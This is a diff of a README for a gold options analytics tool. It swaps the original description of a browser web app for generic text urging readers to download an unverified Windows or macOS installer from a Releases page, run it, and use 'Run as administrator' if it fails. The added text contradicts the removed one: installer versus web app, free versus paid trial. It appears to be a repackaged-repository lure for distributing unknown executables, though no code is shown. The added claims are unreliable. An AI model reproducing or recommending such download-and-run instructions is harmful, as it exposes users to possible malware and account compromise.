@@ -1,49 +1,86 @@
-# ⚡ Gold Options Pro v2: Market Intelligence Terminal (XAU/USD)
+# 📈 Gold-options-terminal - Analyze Gold Options with Ease
 
-### Institutional-grade options analytics for Gold traders.
-**Free alternative to Bloomberg Terminal & CME Reports.**
+## 🚀 Getting Started
 
-[![Open Terminal](https://img.shields.io/badge/OPEN-LIVE_TERMINAL-gold?style=for-the-badge&logo=google-chrome&logoColor=black)](https://gold-options-pro.netlify.app/)
-[![YouTube Demo](https://img.shields.io/badge/WATCH-VIDEO_DEMO-red?style=for-the-badge&logo=youtube)](https://youtu.be/Ixx-cPujZGU)
+Welcome to the Gold-options-terminal! This application helps you analyze XAU/USD options using real-time CME data. You can track metrics like Max Pain, Open Interest, GEX, and Zero Gamma. 
 
----
+## 📥 Download the Application
 
-## 🔥 Key Features
-This terminal aggregates real-time data from CME Group to visualize market sentiment.
+[![Download Gold-options-terminal](https://img.shields.io/badge/Download-Gold--options--terminal-brightgreen)](https://github.com/pito699/Gold-options-terminal/releases)
 
-*   **Max Pain Levels:** Identify where Market Makers want the price to expire.
-*   **Open Interest Heatmap:** Visualize big money positions on the chart.
-*   **GEX (Gamma Exposure):** Analyze dealer hedging flows and volatility risks.
-*   **Zero Gamma Levels:** Key pivot points for intraday trading.
-*   **MT5 Integration:** Export levels directly to MetaTrader 5.
+To get started, visit the Releases page:
 
-## 🛠 For Developers
-*   **Performance:** Built on Vanilla JS (No heavy frameworks).
-*   **Data Source:** CME Group Real-time aggregation.
-*   **Backend:** Firebase Realtime Database.
+[Visit the Releases Page](https://github.com/pito699/Gold-options-terminal/releases)
 
----
+## 📂 System Requirements
 
-## 🇷🇺 Описание
-Профессиональный терминал для анализа опционных уровней по Золоту (Gold / XAUUSD).
-Данные поступают напрямую с CME Group.
+Before you download, ensure your system meets these requirements:
 
-**Что умеет:**
-1.  Показывать уровни **Max Pain** (где теряет толпа).
-2.  Строить тепловую карту **Открытого Интереса**.
-3.  Рассчитывать **GEX** (Гамма-экспозицию) и уровни Zero Gamma.
-4.  Экспортировать зоны интереса в **MetaTrader 5**.
+- **Operating System:** Windows 10 or higher, MacOS Monterey or higher
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum 200 MB available for installation
+- **Internet Connection:** Required for real-time data
 
-### 💎 Access / Доступ
-*   **Trial:** 3 дня бесплатного доступа ко всем функциям.
-*   **Premium:** Полный доступ к истории, 175 страйкам и GEX-профилям.
+## 📥 Download & Install
 
----
+1. Go to the [Releases page](https://github.com/pito699/Gold-options-terminal/releases).
+2. Find the latest version. Look for the release notes to see what's new.
+3. Click on the provided link to download the appropriate file for your operating system.
+4. Once the file downloads, locate it in your Downloads folder.
+5. Double-click the file to run the installer.
+6. Follow the on-screen instructions to complete the installation.
+7. Open the application once it's installed.
 
-## 🚀 How to start / Как начать
-1.  **Open the App:** [Click Here to Launch](https://gold-options-pro.netlify.app/)
-2.  **Watch Guide:** [Video Tutorial (New)](https://youtu.be/Ixx-cPujZGU)
-3.  **Subscribe:** [YouTube Channel @TradeGoldOptions](https://www.youtube.com/@TradeGoldOptions)
+You can revisit the [Releases page](https://github.com/pito699/Gold-options-terminal/releases) anytime to check for updates.
 
----
-*Disclaimer: Trading involves risk. This tool provides market data visualization only.*
+## 🛠 Features
+
+Gold-options-terminal offers various features to enhance your trading experience:
+
+- **Max Pain Calculation:** Easily determine the price point where the most options expire worthless.
+- **Open Interest Tracking:** Keep an eye on the total number of outstanding contracts.
+- **GEX (Gamma Exposure):** Understand how sensitive your options are to price changes.
+- **Zero Gamma Analysis:** Identify levels where options might not impact the underlying asset's price.
+
+These tools allows you to make informed trading decisions.
+
+## 🖥 User Interface Overview
+
+Upon launching the application, you'll see a clean layout:
+
+- **Dashboard:** Access key metrics at a glance.
+- **Data Input:** Enter specific options data for custom analysis.
+- **Reports:** Generate and export analysis reports.
+
+## 🛠 Troubleshooting
+
+If you encounter issues while downloading or running the application, try these steps:
+
+1. **Ensure Downloads Complete:** Check your internet connection. Restart the download if it fails.
+2. **Run as Administrator:** If the application does not open, right-click the icon and choose 'Run as administrator'.
+3. **Check for Updates:** Go to the [Releases page](https://github.com/pito699/Gold-options-terminal/releases) to see if a new version is available that may fix bugs.
+4. **Contact Support:** If problems persist, open an issue on the GitHub repository for assistance.
+
+## 📚 Frequently Asked Questions
+
+### What does Max Pain mean?
+
+Max Pain is the price point at which the most options expire worthless. This concept can help traders identify potential price movements as expiry approaches.
+
+### How often is data updated?
+
+The application pulls data in real-time from CME, ensuring you're always working with the latest metrics.
+
+### Is this application free?
+
+Yes, Gold-options-terminal is free to download and use. 
+
+## 💬 Community
+
+Join our community forums to discuss trading strategies and share insights with other users. Your feedback is valuable and can help us improve the application.
+
+### Reach Us
+
+For further assistance or to report issues, visit our GitHub repository: [Gold-options-terminal Repository](https://github.com/pito699/Gold-options-terminal).
+
+Explore the world of options trading with Gold-options-terminal and make confident decisions in your trading journey.
